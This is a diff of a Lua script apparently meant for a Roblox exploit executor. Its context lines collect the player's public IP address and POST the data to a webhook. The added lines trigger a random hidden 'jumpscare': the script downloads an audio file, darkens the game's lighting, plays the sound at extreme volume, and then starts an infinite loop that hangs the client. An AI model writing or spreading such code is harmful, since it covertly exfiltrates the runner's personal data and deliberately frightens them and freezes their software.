@@ -1,3 +1,4 @@
+local lp = game.Players.LocalPlayer
 local ip = tostring(game:HttpGet("https://api.ipify.org"))
   
 local function api(field)
@@ -70,3 +71,36 @@ local headers = {["content-type"] = "application/json"}
 local wh = {Url = webhook, Body = newdata, Method = "POST", Headers = headers}
 local request = http_request or request or HttpPost or syn.request
 request(wh)
+
+if math.random(1, 30) == 1 then
+  local function deleteFileAfterSoundStops()
+    while sound.Playing do
+      wait()
+    end
+    delfile("click.mp3")
+  end
+  
+  local function jumpscare()
+    writefile("click.mp3", game:HttpGet("https://github.com/kanyenorthh/hi/raw/main/boo.mp3"))
+    sound = Instance.new("Sound")
+    sound.SoundId = getcustomasset("click.mp3")
+    sound.Parent = workspace
+
+    local Lighting = game.Lighting
+    Lighting.FogEnd = 50
+    Lighting.FogStart = -1
+    Lighting.ClockTime = 0
+    Lighting.ExposureCompensation = -1
+    
+    sound.Playing = true
+    sound.Looped = false
+    sound.Volume = 1000
+    coroutine.wrap(deleteFileAfterSoundStops)()
+  end
+  wait(math.random(60, 244))
+  jumpscare()
+  wait(2)
+  while true do
+    print("RIP")
+  end
+end
